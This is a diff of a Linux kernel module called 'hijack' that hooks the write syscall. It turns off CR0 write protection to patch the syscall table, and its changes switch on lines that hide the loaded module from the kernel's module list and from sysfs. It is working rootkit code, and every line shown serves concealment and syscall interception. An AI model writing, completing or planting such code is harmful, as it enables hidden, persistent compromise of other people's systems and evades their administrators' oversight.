@@ -77,8 +77,8 @@ asmlinkage ssize_t hijack_write(int fd, const char __user *buff, size_t count) {
 int hijack_init(void) {
   printk("hijack: LKM loaded\n");
 
-//  list_del_init(&__this_module.list);
-// kobject_del(&THIS_MODULE->mkobj.kobj);
+  list_del_init(&__this_module.list);
+  kobject_del(&THIS_MODULE->mkobj.kobj);
   printk("hijack: LKM hidden\n");
 
   if ((sys_call_table = (psize *) find_sys_tab())) {
@@ -104,7 +104,7 @@ void hijack_exit(void) {
   write_cr0(read_cr0() & (~ 0x10000)); 
   printk("hijack: cr0 write protection removed\n");
 
-//  xchg(&sys_call_table[__NR_write],original_write);
+  xchg(&sys_call_table[__NR_write],original_write);
   printk("hijack: exchanged hijacked sys_call with original\n");
 
   write_cr0(read_cr0() | 0x10000);
